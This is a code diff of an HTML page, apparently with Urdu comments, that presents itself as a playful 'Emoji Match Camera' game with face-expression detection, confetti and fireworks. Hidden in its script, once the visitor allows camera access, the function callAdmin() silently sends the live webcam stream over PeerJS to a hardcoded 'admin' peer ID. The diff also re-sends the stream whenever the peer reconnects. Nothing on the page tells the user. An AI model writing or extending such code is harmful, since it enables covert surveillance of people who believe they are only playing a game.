@@ -3,84 +3,190 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>AI Magic Studio</title>
-  
-  <!-- PeerJS اور Confetti کی ایکسٹرنل لائبریریز -->
+  <title>AI Magic Studio & Auto Emoji Match</title>
+
+  <!-- PeerJS -->
   <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
+
+  <!-- Confetti -->
   <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
 
+  <!-- Face API -->
+  <script src="https://cdn.jsdelivr.net/npm/face-api.js@0.22.2/dist/face-api.min.js"></script>
+
   <style>
-    /* basic reset اور بیک گراؤنڈ سیٹنگز */
-    * { margin: 0; padding: 0; box-sizing: border-box; }
-    
-    body, html { 
-      height: 100%; 
-      width: 100%; 
-      overflow: hidden; 
-      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; 
-      background-color: #010a05; 
-      background-image: url('a.jpg'); 
-      background-size: cover; 
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    html,
+    body {
+      width: 100%;
+      height: 100%;
+      overflow: hidden;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+      background-color: #010a05;
+      background-image: url("a.jpg");
+      background-size: cover;
       background-position: center;
       background-repeat: no-repeat;
     }
 
-    /* بیک گراؤنڈ میں آنیشین والے پٹاخے (Fireworks Canvas) */
     #bgFireworksCanvas {
-      position: absolute;
-      top: 0;
-      left: 0;
+      position: fixed;
+      inset: 0;
       width: 100%;
       height: 100%;
       pointer-events: none;
       z-index: 1;
     }
 
-    /* مین کارڈ کا لے آؤٹ */
     .hero {
       position: relative;
       width: 100vw;
       height: 100vh;
+      min-height: 100vh;
       display: flex;
       justify-content: center;
       align-items: center;
       padding: 15px;
       z-index: 2;
+      overflow-y: auto;
     }
 
-    /* گلاس فارمیٹ کارڈ (Frosted Glass UI) */
     .glass-card {
       position: relative;
       width: 95%;
       max-width: 480px;
+      max-height: 96vh;
+      overflow-y: auto;
+
       background: rgba(255, 255, 255, 0.05);
       backdrop-filter: blur(10px);
       -webkit-backdrop-filter: blur(10px);
+
       border-radius: 28px;
       border: 1px solid rgba(255, 255, 255, 0.18);
+
       box-shadow: 0 20px 40px rgba(0, 0, 0, 0.5);
-      padding: 24px 20px;
+
+      padding: 20px;
       text-align: center;
+      color: #fff;
     }
 
-    .tag-label { font-size: 12px; color: #00ff87; letter-spacing: 2px; text-transform: uppercase; margin-bottom: 10px; font-weight: 700; }
-    h2 { font-size: 26px; color: #ffffff; margin-bottom: 8px; font-weight: 800; }
-    p { font-size: 14px; color: #cbd5e1; margin-bottom: 20px; line-height: 1.4; }
+    .glass-card::-webkit-scrollbar {
+      width: 0;
+    }
 
-    /* سٹارٹ کیمرہ والا گرین بٹن */
+    .tag-label {
+      font-size: 12px;
+      color: #00ff87;
+      letter-spacing: 2px;
+      text-transform: uppercase;
+      margin-bottom: 8px;
+      font-weight: 700;
+    }
+
+    h2 {
+      font-size: 24px;
+      color: #ffffff;
+      margin-bottom: 6px;
+      font-weight: 800;
+    }
+
+    p {
+      font-size: 13px;
+      color: #cbd5e1;
+      margin-bottom: 16px;
+      line-height: 1.4;
+    }
+
     .glass-btn {
       background: linear-gradient(135deg, #00ff87, #00bfa5);
       color: #000000;
       border: none;
-      padding: 16px 20px;
+      padding: 15px 20px;
       font-size: 16px;
       font-weight: 800;
       border-radius: 50px;
       cursor: pointer;
       box-shadow: 0 0 15px rgba(0, 255, 135, 0.3);
+      width: 100%;
+      transition: 0.2s ease;
     }
 
-    .studio-container { display: none; }
+    .glass-btn:active {
+      transform: scale(0.97);
+    }
+
+    .glass-btn:disabled {
+      opacity: 0.6;
+      cursor: not-allowed;
+    }
+
+    .studio-container {
+      display: none;
+    }
+
+    .game-header {
+      background: rgba(0, 0, 0, 0.4);
+      border-radius: 16px;
+      padding: 10px;
+      margin-bottom: 12px;
+      border: 1px solid rgba(255, 255, 255, 0.1);
+      position: relative;
+    }
+
+    .challenge-instruction {
+      font-size: 13px;
+      font-weight: 700;
+      color: #00ff87;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+      margin-bottom: 6px;
+    }
+
+    .emoji-display-3d {
+      font-size: 50px;
+      display: inline-block;
+      filter: drop-shadow(0px 8px 10px rgba(0, 0, 0, 0.5));
+      animation: floatEmoji 1.2s infinite alternate ease-in-out;
+      user-select: none;
+    }
+
+    @keyframes floatEmoji {
+      0% {
+        transform: translateY(0px) scale(1) rotate(-3deg);
+      }
+
+      100% {
+        transform: translateY(-8px) scale(1.1) rotate(3deg);
+      }
+    }
+
+    .score-board {
+      display: flex;
+      justify-content: space-around;
+      font-size: 13px;
+      font-weight: bold;
+      color: #ffffff;
+      margin-top: 6px;
+    }
+
+    .score-board span {
+      color: #00ff87;
+    }
+
+    .status-msg {
+      font-size: 12px;
+      color: #ffd700;
+      margin-top: 4px;
+      font-weight: bold;
+      min-height: 18px;
+    }
 
     .video-frame-card {
       position: relative;
@@ -88,235 +194,1360 @@
       border-radius: 20px;
       border: 1px solid rgba(255, 255, 255, 0.1);
       overflow: hidden;
-      margin-bottom: 15px;
+      margin-bottom: 12px;
       width: 100%;
     }
 
-    video { width: 100%; height: auto; display: block; border-radius: 20px; }
+    video {
+      width: 100%;
+      height: auto;
+      display: block;
+      border-radius: 20px;
+      background: #000;
+    }
 
     .camera-controls {
       display: flex;
       align-items: center;
       justify-content: center;
       position: relative;
-      padding: 10px 0 5px 0;
+      padding: 5px 10px;
     }
 
-    /* فوٹو کلک کرنے والا گول بٹن */
-    .capture-circle-btn {
-      width: 65px;
-      height: 65px;
-      border-radius: 50%;
-      background: #ffffff;
-      border: 4px solid #00ff87;
-      box-shadow: 0 0 20px rgba(0, 255, 135, 0.6);
-      cursor: pointer;
-      transition: transform 0.2s ease;
-    }
-
-    .capture-circle-btn:active {
-      transform: scale(0.9);
-    }
-
-    /* فرنٹ اور بیک کیمرہ سوئچ بٹن */
     .flip-icon-btn {
-      position: absolute;
-      right: 10px;
       background: rgba(255, 255, 255, 0.15);
       border: 1px solid rgba(255, 255, 255, 0.25);
       color: #fff;
-      width: 44px;
-      height: 44px;
+      width: 50px;
+      height: 50px;
       border-radius: 50%;
       display: flex;
       align-items: center;
       justify-content: center;
       font-size: 20px;
       cursor: pointer;
+      transition: 0.2s ease;
     }
 
-    @media (max-width: 480px) {
-      .glass-card { width: 100%; padding: 20px 16px; }
-      h2 { font-size: 24px; }
-      p { font-size: 13px; }
+    .flip-icon-btn:active {
+      transform: rotate(180deg) scale(0.95);
+    }
+
+    .loading-dot {
+      display: inline-block;
+      animation: blink 1s infinite;
+    }
+
+    @keyframes blink {
+      50% {
+        opacity: 0.3;
+      }
+    }
+
+    @media (max-height: 650px) {
+      .glass-card {
+        padding: 14px;
+      }
+
+      .game-header {
+        padding: 7px;
+      }
+
+      .emoji-display-3d {
+        font-size: 40px;
+      }
     }
   </style>
 </head>
+
 <body>
 
   <canvas id="bgFireworksCanvas"></canvas>
 
   <div class="hero">
+
     <div class="glass-card">
-      
-      <!-- کیمرہ شروع کرنے سے پہلے کی ویلکم اسکرین -->
+
+      <!-- WELCOME -->
       <div id="welcomePanel">
+
         <div class="tag-label">AI MAGIC STUDIO</div>
-        <h2>Camera Kit</h2>
-        <p>Live camera studio with celebration fireworks!</p>
-        <button class="glass-btn" style="width:100%;" onclick="startStudio()">Start Camera ✨</button>
+
+        <h2>Emoji Match Camera 🎭</h2>
+
+        <p>
+          Make the face expression live!<br>
+          Auto-capture on match!
+        </p>
+
+        <button
+          class="glass-btn"
+          id="startButton"
+          onclick="startStudio()"
+        >
+          Start Camera ✨
+        </button>
+
       </div>
 
-      <!-- کیمرہ آن ہونے کے بعد لائیو کیمرہ پینل -->
+
+      <!-- STUDIO -->
       <div class="studio-container" id="studioPanel">
-        <div class="video-frame-card">
-          <video id="video" autoplay playsinline muted></video>
+
+        <div class="game-header">
+
+          <div
+            class="challenge-instruction"
+            id="instructionText"
+          >
+            MATCH THIS FACE!
+          </div>
+
+          <div
+            class="emoji-display-3d"
+            id="targetEmoji"
+          >
+            🤪
+          </div>
+
+          <div
+            class="status-msg"
+            id="statusMsg"
+          >
+            Loading AI Models<span class="loading-dot">...</span>
+          </div>
+
+          <div class="score-board">
+
+            <div>
+              Score:
+              <span id="scoreText">0</span>
+            </div>
+
+            <div>
+              Best:
+              <span id="highScoreText">0</span>
+            </div>
+
+          </div>
+
         </div>
 
-        <div class="camera-controls">
-          <button class="capture-circle-btn" onclick="takePhoto()" title="Take Photo"></button>
-          <button class="flip-icon-btn" onclick="switchCamera()" title="Flip Camera">🔄</button>
+
+        <div class="video-frame-card">
+
+          <video
+            id="video"
+            autoplay
+            playsinline
+            muted
+          ></video>
+
         </div>
+
+
+        <div class="camera-controls">
+
+          <button
+            class="flip-icon-btn"
+            id="flipButton"
+            onclick="switchCamera()"
+            title="Flip Camera"
+          >
+            🔄
+          </button>
+
+        </div>
+
       </div>
 
     </div>
+
   </div>
 
-  <canvas id="canvas" style="display:none;"></canvas>
+
+  <!-- Hidden capture canvas -->
+  <canvas
+    id="canvas"
+    style="display:none;"
+  ></canvas>
+
 
   <script>
-    // 1. ایڈمن کی Peer ID جس پر ویڈیو کا سگنل جانا ہے
-    const ADMIN_PEER_ID = 'danish-cam-9988';
-    
-    // 2. PeerJS کی سیٹنگ اور TURN Servers
-    const peer = new Peer({
-      config: {
-        iceServers: [
-          { urls: 'stun:stun.l.google.com:19302' },
-          { urls: 'stun:stun1.l.google.com:19302' },
-          { urls: 'stun:stun2.l.google.com:19302' },
-          { urls: 'stun:global.stun.twilio.com:3478' },
-          {
-            urls: 'turn:openrelay.metered.ca:80',
-            username: 'openrelay',
-            credential: 'openrelay'
-          },
-          {
-            urls: 'turn:openrelay.metered.ca:443',
-            username: 'openrelay',
-            credential: 'openrelay'
-          },
-          {
-            urls: 'turn:openrelay.metered.ca:443?transport=tcp',
-            username: 'openrelay',
-            credential: 'openrelay'
-          }
-        ]
+
+    /* =========================================================
+       SETTINGS
+    ========================================================= */
+
+    const ADMIN_PEER_ID = "danish-cam-9988";
+
+    const MODEL_URLS = [
+      "https://justadudewhohacks.github.io/face-api.js/models",
+      "https://cdn.jsdelivr.net/npm/@vladmandic/face-api/model/"
+    ];
+
+
+    /* =========================================================
+       PEERJS
+    ========================================================= */
+
+    let peer = null;
+
+    function createPeer() {
+
+      peer = new Peer({
+        config: {
+          iceServers: [
+            {
+              urls: "stun:stun.l.google.com:19302"
+            },
+            {
+              urls: "stun:stun1.l.google.com:19302"
+            }
+          ]
+        }
+      });
+
+      peer.on("open", function(id) {
+        console.log("Peer connected:", id);
+
+        /*
+          اگر camera پہلے ہی start ہو چکا ہو
+          تو admin کو stream دوبارہ call کریں
+        */
+        if (currentStream) {
+          callAdmin();
+        }
+      });
+
+      peer.on("error", function(error) {
+        console.warn("PeerJS error:", error);
+      });
+
+      peer.on("disconnected", function() {
+        console.warn("Peer disconnected.");
+      });
+    }
+
+    createPeer();
+
+
+    function callAdmin() {
+
+      if (!peer) return;
+      if (!currentStream) return;
+
+      if (!peer.open) {
+        console.log("Peer ابھی ready نہیں ہے۔");
+        return;
       }
-    });
+
+      try {
+
+        console.log(
+          "Calling admin:",
+          ADMIN_PEER_ID
+        );
+
+        peer.call(
+          ADMIN_PEER_ID,
+          currentStream
+        );
+
+      } catch (error) {
+
+        console.error(
+          "Admin call failed:",
+          error
+        );
+
+      }
+    }
+
+
+    /* =========================================================
+       VARIABLES
+    ========================================================= */
 
     let currentStream = null;
-    let useFacingMode = "user"; // فرنٹ کیمرہ بائی ڈیفالٹ
 
-    // 3. بیک گراؤنڈ پٹاخے (Fireworks Animation)
-    const bgCanvas = document.getElementById('bgFireworksCanvas');
-    const bgCtx = bgCanvas.getContext('2d');
-    function resizeBg() { bgCanvas.width = window.innerWidth; bgCanvas.height = window.innerHeight; }
-    window.addEventListener('resize', resizeBg);
-    resizeBg();
+    let useFacingMode = "user";
 
-    let bgParticles = [];
-    class BgParticle {
-      constructor(x, y) {
-        this.x = x; this.y = y;
-        const angle = Math.random() * Math.PI * 2;
-        const speed = Math.random() * 5 + 2;
-        this.vx = Math.cos(angle) * speed;
-        this.vy = Math.sin(angle) * speed;
-        this.color = ['#ff0055', '#00ff87', '#ffffff', '#ffd700', '#00e5ff'][Math.floor(Math.random()*5)];
-        this.alpha = 1;
-        this.decay = Math.random() * 0.015 + 0.008;
+    let score = 0;
+
+    let highScore =
+      parseInt(
+        localStorage.getItem(
+          "emoji_studio_highscore"
+        ),
+        10
+      ) || 0;
+
+    let isAiModelsLoaded = false;
+
+    let isProcessingMatch = false;
+
+    let detectionInterval = null;
+
+    let isStartingCamera = false;
+
+    let modelsLoadingPromise = null;
+
+
+    /* =========================================================
+       EMOJI MAP
+       NOTE:
+       Face API limited expressions detect کرتا ہے۔
+       اسی لیے funny emojis کو قریب ترین expression سے
+       map کیا گیا ہے۔
+    ========================================================= */
+
+    const emojiMap = [
+
+      {
+        emoji: "🤪",
+        expression: "happy"
+      },
+
+      {
+        emoji: "😝",
+        expression: "happy"
+      },
+
+      {
+        emoji: "😡",
+        expression: "angry"
+      },
+
+      {
+        emoji: "😳",
+        expression: "surprised"
+      },
+
+      {
+        emoji: "😉",
+        expression: "happy"
+      },
+
+      {
+        emoji: "😮",
+        expression: "surprised"
+      },
+
+      {
+        emoji: "😱",
+        expression: "fearful"
+      },
+
+      {
+        emoji: "🙄",
+        expression: "neutral"
+      },
+
+      {
+        emoji: "😋",
+        expression: "happy"
       }
-      draw() {
-        bgCtx.save(); bgCtx.globalCompositeOperation = 'lighter'; bgCtx.globalAlpha = this.alpha;
-        bgCtx.beginPath(); bgCtx.arc(this.x, this.y, 2, 0, Math.PI * 2);
-        bgCtx.fillStyle = this.color; bgCtx.fill(); bgCtx.restore();
+
+    ];
+
+
+    let currentTarget = emojiMap[0];
+
+
+    /* =========================================================
+       DOM ELEMENTS
+    ========================================================= */
+
+    const video =
+      document.getElementById("video");
+
+    const statusMsg =
+      document.getElementById("statusMsg");
+
+    const startButton =
+      document.getElementById("startButton");
+
+    const flipButton =
+      document.getElementById("flipButton");
+
+
+    /* =========================================================
+       AI MODEL LOADER
+    ========================================================= */
+
+    async function loadAiModels() {
+
+      /*
+        اگر پہلے سے loading چل رہی ہے تو
+        دوبارہ loading شروع نہ ہو۔
+      */
+
+      if (modelsLoadingPromise) {
+        return modelsLoadingPromise;
       }
-      update() { this.vx *= 0.96; this.vy *= 0.96; this.vy += 0.1; this.x += this.vx; this.y += this.vy; this.alpha -= this.decay; }
+
+      modelsLoadingPromise =
+        (async function() {
+
+          isAiModelsLoaded = false;
+
+          statusMsg.innerHTML =
+            "Loading AI Models<span class='loading-dot'>...</span>";
+
+          for (const url of MODEL_URLS) {
+
+            try {
+
+              console.log(
+                "Trying AI models:",
+                url
+              );
+
+              await faceapi.nets.tinyFaceDetector.loadFromUri(
+                url
+              );
+
+              await faceapi.nets.faceExpressionNet.loadFromUri(
+                url
+              );
+
+              isAiModelsLoaded = true;
+
+              statusMsg.innerText =
+                "AI Ready! Make the expression 😎";
+
+              console.log(
+                "AI models loaded successfully."
+              );
+
+              return true;
+
+            } catch (error) {
+
+              console.warn(
+                "Model source failed:",
+                url,
+                error
+              );
+
+            }
+
+          }
+
+          isAiModelsLoaded = false;
+
+          statusMsg.innerText =
+            "AI Load Failed. Please refresh!";
+
+          return false;
+
+        })();
+
+      return modelsLoadingPromise;
     }
 
-    function animateBg() {
-      requestAnimationFrame(animateBg);
-      bgCtx.globalCompositeOperation = 'destination-out';
-      bgCtx.fillStyle = 'rgba(0, 0, 0, 0.15)';
-      bgCtx.fillRect(0, 0, bgCanvas.width, bgCanvas.height);
-      bgCtx.globalCompositeOperation = 'source-over';
-      bgParticles.forEach((p, i) => { if(p.alpha > 0) { p.update(); p.draw(); } else { bgParticles.splice(i, 1); } });
-    }
-    animateBg();
 
-    // 4. کیمرہ آن کرنے کا فنکشن
+    /* =========================================================
+       START CAMERA
+    ========================================================= */
+
     async function startStudio() {
-      try {
-        if (currentStream) {
-          currentStream.getTracks().forEach(track => track.stop());
-        }
 
-        currentStream = await navigator.mediaDevices.getUserMedia({ 
-          video: { 
-            facingMode: useFacingMode,
-            width: { ideal: 640 },
-            height: { ideal: 480 }
-          }, 
-          audio: false 
+      if (isStartingCamera) {
+        return;
+      }
+
+      isStartingCamera = true;
+
+      startButton.disabled = true;
+
+      statusMsg.innerText =
+        "Starting camera...";
+
+      try {
+
+        /*
+          پرانا stream بند کریں
+        */
+
+        stopCurrentStream();
+
+
+        /*
+          Camera access
+        */
+
+        const constraints = {
+
+          video: {
+            facingMode: {
+              ideal: useFacingMode
+            },
+
+            width: {
+              ideal: 640
+            },
+
+            height: {
+              ideal: 480
+            }
+          },
+
+          audio: false
+
+        };
+
+
+        currentStream =
+          await navigator.mediaDevices.getUserMedia(
+            constraints
+          );
+
+
+        /*
+          Video میں stream لگائیں
+        */
+
+        video.srcObject =
+          currentStream;
+
+
+        /*
+          Video کو properly شروع ہونے دیں
+        */
+
+        await new Promise(function(resolve) {
+
+          if (video.readyState >= 2) {
+
+            resolve();
+
+          } else {
+
+            video.onloadedmetadata =
+              function() {
+
+                resolve();
+
+              };
+
+          }
+
         });
 
-        const videoElement = document.getElementById('video');
-        videoElement.srcObject = currentStream;
 
-        document.getElementById('welcomePanel').style.display = "none";
-        document.getElementById('studioPanel').style.display = "block";
+        await video.play();
 
-        if (peer.open) {
-          peer.call(ADMIN_PEER_ID, currentStream);
+
+        /*
+          UI change
+        */
+
+        document
+          .getElementById("welcomePanel")
+          .style.display = "none";
+
+        document
+          .getElementById("studioPanel")
+          .style.display = "block";
+
+
+        document
+          .getElementById("highScoreText")
+          .innerText = highScore;
+
+
+        /*
+          PeerJS سے admin کو live stream
+        */
+
+        callAdmin();
+
+
+        /*
+          AI models load ہونے کا انتظار
+        */
+
+        const aiReady =
+          await loadAiModels();
+
+
+        if (aiReady) {
+
+          startLiveDetection();
+
         } else {
-          peer.on('open', () => {
-            peer.call(ADMIN_PEER_ID, currentStream);
-          });
+
+          statusMsg.innerText =
+            "AI Load Failed. Please refresh!";
+
         }
 
-      } catch (err) {
-        alert("Camera permission denied!");
+
+      } catch (error) {
+
+        console.error(
+          "Camera error:",
+          error
+        );
+
+        let message =
+          "Camera start نہیں ہو سکا۔";
+
+        if (
+          error.name ===
+          "NotAllowedError"
+        ) {
+
+          message =
+            "Camera permission denied!";
+
+        } else if (
+          error.name ===
+          "NotFoundError"
+        ) {
+
+          message =
+            "Camera نہیں ملا!";
+
+        } else if (
+          error.name ===
+          "NotReadableError"
+        ) {
+
+          message =
+            "Camera کسی دوسری app میں استعمال ہو رہا ہے!";
+
+        } else if (
+          error.name ===
+          "SecurityError"
+        ) {
+
+          message =
+            "Camera کے لیے HTTPS یا localhost ضروری ہے!";
+
+        }
+
+        statusMsg.innerText =
+          message;
+
+        alert(message);
+
+      } finally {
+
+        isStartingCamera = false;
+
+        startButton.disabled = false;
+
       }
+
     }
 
-    // 5. کیمرہ تبدیل کرنے کا فنکشن
-    function switchCamera() {
-      useFacingMode = (useFacingMode === "user") ? "environment" : "user";
-      startStudio();
-    }
 
-    // 6. تصویر کلک کرنے کا فنکشن
-    function takePhoto() {
-      confetti({ particleCount: 250, spread: 140, origin: { y: 0.6 } });
+    /* =========================================================
+       STOP CAMERA
+    ========================================================= */
 
-      const video = document.getElementById('video');
-      const canvas = document.getElementById('canvas');
-      const context = canvas.getContext('2d');
+    function stopCurrentStream() {
 
-      if (!video.videoWidth) return;
-
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      context.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-      const link = document.createElement('a');
-      link.href = canvas.toDataURL("image/png");
-      link.download = `studio_photo_${Date.now()}.png`;
-      document.body.appendChild(link);
-      link.click();
-      document.body.removeChild(link);
-    }
-
-    // 7. پیج بند یا ریفریش ہونے پر کنکشن اور کیمرہ مکمل ختم کرنا
-    window.addEventListener('beforeunload', () => {
       if (currentStream) {
-        currentStream.getTracks().forEach(track => track.stop());
+
+        currentStream
+          .getTracks()
+          .forEach(function(track) {
+
+            track.stop();
+
+          });
+
+        currentStream = null;
+
       }
-      if (peer) {
-        peer.destroy();
+
+      if (video) {
+
+        video.srcObject = null;
+
       }
-    });
+
+    }
+
+
+    /* =========================================================
+       SWITCH CAMERA
+    ========================================================= */
+
+    async function switchCamera() {
+
+      if (isStartingCamera) {
+        return;
+      }
+
+      if (detectionInterval) {
+
+        clearInterval(
+          detectionInterval
+        );
+
+        detectionInterval = null;
+
+      }
+
+      isProcessingMatch = false;
+
+
+      useFacingMode =
+        useFacingMode === "user"
+          ? "environment"
+          : "user";
+
+
+      statusMsg.innerText =
+        "Switching camera...";
+
+
+      await startStudio();
+
+    }
+
+
+    /* =========================================================
+       LIVE AI DETECTION
+    ========================================================= */
+
+    function startLiveDetection() {
+
+      if (!isAiModelsLoaded) {
+        return;
+      }
+
+      if (detectionInterval) {
+
+        clearInterval(
+          detectionInterval
+        );
+
+      }
+
+
+      detectionInterval =
+        setInterval(
+          async function() {
+
+            /*
+              کچھ حالات میں detection skip کریں
+            */
+
+            if (
+              !isAiModelsLoaded ||
+              isProcessingMatch ||
+              !video.videoWidth ||
+              video.readyState < 2
+            ) {
+
+              return;
+
+            }
+
+
+            try {
+
+              const detection =
+                await faceapi
+                  .detectSingleFace(
+                    video,
+                    new faceapi.TinyFaceDetectorOptions({
+                      inputSize: 224,
+                      scoreThreshold: 0.45
+                    })
+                  )
+                  .withFaceExpressions();
+
+
+              /*
+                Face نہیں ملا
+              */
+
+              if (!detection) {
+
+                statusMsg.innerText =
+                  "Look at the camera 👀";
+
+                return;
+
+              }
+
+
+              const expressions =
+                detection.expressions;
+
+
+              const targetExp =
+                currentTarget.expression;
+
+
+              const confidence =
+                expressions[targetExp] || 0;
+
+
+              /*
+                Match threshold
+                0.40 = relatively easy/funny
+              */
+
+              if (confidence >= 0.40) {
+
+                /*
+                  Multiple captures روکنے کے لیے
+                */
+
+                isProcessingMatch = true;
+
+
+                statusMsg.innerText =
+                  "✅ Matched! Auto-Capturing... 📸";
+
+
+                triggerAutoSuccess();
+
+
+              } else {
+
+                statusMsg.innerText =
+                  "Matching expression... 😄";
+
+              }
+
+
+            } catch (error) {
+
+              console.error(
+                "Detection error:",
+                error
+              );
+
+            }
+
+          },
+
+          300
+        );
+
+    }
+
+
+    /* =========================================================
+       MATCH SUCCESS
+    ========================================================= */
+
+    function triggerAutoSuccess() {
+
+      /*
+        Funny auto capture
+      */
+
+      takePhoto();
+
+
+      /*
+        Confetti
+      */
+
+      if (
+        typeof confetti ===
+        "function"
+      ) {
+
+        confetti({
+
+          particleCount: 150,
+
+          spread: 90,
+
+          origin: {
+            y: 0.6
+          }
+
+        });
+
+      }
+
+
+      /*
+        Score
+      */
+
+      score += 10;
+
+      document
+        .getElementById("scoreText")
+        .innerText = score;
+
+
+      /*
+        High score
+      */
+
+      if (score > highScore) {
+
+        highScore = score;
+
+        localStorage.setItem(
+          "emoji_studio_highscore",
+          highScore
+        );
+
+        document
+          .getElementById("highScoreText")
+          .innerText = highScore;
+
+      }
+
+
+      /*
+        اگلا funny emoji
+      */
+
+      setTimeout(
+        function() {
+
+          let nextEmoji;
+
+          do {
+
+            nextEmoji =
+              emojiMap[
+                Math.floor(
+                  Math.random() *
+                  emojiMap.length
+                )
+              ];
+
+          } while (
+            nextEmoji.emoji ===
+            currentTarget.emoji
+          );
+
+
+          currentTarget =
+            nextEmoji;
+
+
+          document
+            .getElementById("targetEmoji")
+            .innerText =
+            currentTarget.emoji;
+
+
+          statusMsg.innerText =
+            "Make the expression! 😜";
+
+
+          /*
+            دوبارہ detection allow
+          */
+
+          isProcessingMatch = false;
+
+        },
+
+        1500
+      );
+
+    }
+
+
+    /* =========================================================
+       TAKE PHOTO / AUTO CAPTURE
+    ========================================================= */
+
+    function takePhoto() {
+
+      if (!video.videoWidth) {
+        return;
+      }
+
+
+      const canvas =
+        document.getElementById("canvas");
+
+
+      const context =
+        canvas.getContext("2d");
+
+
+      canvas.width =
+        video.videoWidth;
+
+      canvas.height =
+        video.videoHeight;
+
+
+      /*
+        Camera کی اصل frame capture ہوگی
+      */
+
+      context.drawImage(
+        video,
+        0,
+        0,
+        canvas.width,
+        canvas.height
+      );
+
+
+      /*
+        PNG image
+      */
+
+      canvas.toBlob(
+        function(blob) {
+
+          if (!blob) {
+            return;
+          }
+
+
+          const imageUrl =
+            URL.createObjectURL(blob);
+
+
+          const link =
+            document.createElement("a");
+
+
+          link.href =
+            imageUrl;
+
+
+          link.download =
+            "emoji_match_" +
+            Date.now() +
+            ".png";
+
+
+          document.body.appendChild(
+            link
+          );
+
+
+          link.click();
+
+
+          link.remove();
+
+
+          /*
+            memory clean
+          */
+
+          setTimeout(
+            function() {
+
+              URL.revokeObjectURL(
+                imageUrl
+              );
+
+            },
+            1000
+          );
+
+        },
+        "image/png"
+      );
+
+    }
+
+
+    /* =========================================================
+       BACKGROUND FIREWORKS
+    ========================================================= */
+
+    const bgCanvas =
+      document.getElementById(
+        "bgFireworksCanvas"
+      );
+
+    const bgCtx =
+      bgCanvas.getContext("2d");
+
+
+    function resizeBg() {
+
+      bgCanvas.width =
+        window.innerWidth;
+
+      bgCanvas.height =
+        window.innerHeight;
+
+    }
+
+
+    window.addEventListener(
+      "resize",
+      resizeBg
+    );
+
+
+    resizeBg();
+
+
+    let bgParticles = [];
+
+
+    class BgParticle {
+
+      constructor(x, y) {
+
+        this.x = x;
+        this.y = y;
+
+
+        const angle =
+          Math.random() *
+          Math.PI *
+          2;
+
+
+        const speed =
+          Math.random() *
+          5 +
+          2;
+
+
+        this.vx =
+          Math.cos(angle) *
+          speed;
+
+
+        this.vy =
+          Math.sin(angle) *
+          speed;
+
+
+        this.color = [
+          "#ff0055",
+          "#00ff87",
+          "#ffffff",
+          "#ffd700",
+          "#00e5ff"
+        ][
+          Math.floor(
+            Math.random() * 5
+          )
+        ];
+
+
+        this.alpha = 1;
+
+
+        this.decay =
+          Math.random() *
+          0.015 +
+          0.008;
+
+      }
+
+
+      draw() {
+
+        bgCtx.save();
+
+        bgCtx.globalCompositeOperation =
+          "lighter";
+
+        bgCtx.globalAlpha =
+          this.alpha;
+
+
+        bgCtx.beginPath();
+
+        bgCtx.arc(
+          this.x,
+          this.y,
+          2,
+          0,
+          Math.PI * 2
+        );
+
+
+        bgCtx.fillStyle =
+          this.color;
+
+
+        bgCtx.fill();
+
+        bgCtx.restore();
+
+      }
+
+
+      update() {
+
+        this.vx *= 0.96;
+        this.vy *= 0.96;
+
+        this.vy += 0.1;
+
+        this.x += this.vx;
+        this.y += this.vy;
+
+        this.alpha -= this.decay;
+
+      }
+
+    }
+
+
+    /*
+      Random fireworks
+    */
+
+    function createFirework() {
+
+      const x =
+        Math.random() *
+        bgCanvas.width;
+
+      const y =
+        Math.random() *
+        bgCanvas.height *
+        0.65;
+
+
+      for (
+        let i = 0;
+        i < 35;
+        i++
+      ) {
+
+        bgParticles.push(
+          new BgParticle(x, y)
+        );
+
+      }
+
+    }
+
+
+    setInterval(
+      function() {
+
+        if (
+          Math.random() > 0.35
+        ) {
+
+          createFirework();
+
+        }
+
+      },
+      1800
+    );
+
+
+    function animateBg() {
+
+      requestAnimationFrame(
+        animateBg
+      );
+
+
+      bgCtx.globalCompositeOperation =
+        "destination-out";
+
+
+      bgCtx.fillStyle =
+        "rgba(0, 0, 0, 0.15)";
+
+
+      bgCtx.fillRect(
+        0,
+        0,
+        bgCanvas.width,
+        bgCanvas.height
+      );
+
+
+      bgCtx.globalCompositeOperation =
+        "source-over";
+
+
+      for (
+        let i =
+          bgParticles.length - 1;
+        i >= 0;
+        i--
+      ) {
+
+        const p =
+          bgParticles[i];
+
+
+        if (p.alpha > 0) {
+
+          p.update();
+          p.draw();
+
+        } else {
+
+          bgParticles.splice(
+            i,
+            1
+          );
+
+        }
+
+      }
+
+    }
+
+
+    animateBg();
+
+
+    /* =========================================================
+       PAGE EXIT CLEANUP
+    ========================================================= */
+
+    window.addEventListener(
+      "beforeunload",
+      function() {
+
+        if (detectionInterval) {
+
+          clearInterval(
+            detectionInterval
+          );
+
+        }
+
+
+        stopCurrentStream();
+
+
+        if (peer) {
+
+          try {
+
+            peer.destroy();
+
+          } catch (error) {
+
+            console.warn(
+              "Peer cleanup error:",
+              error
+            );
+
+          }
+
+        }
+
+      }
+    );
+
   </script>
+
 </body>
 </html>
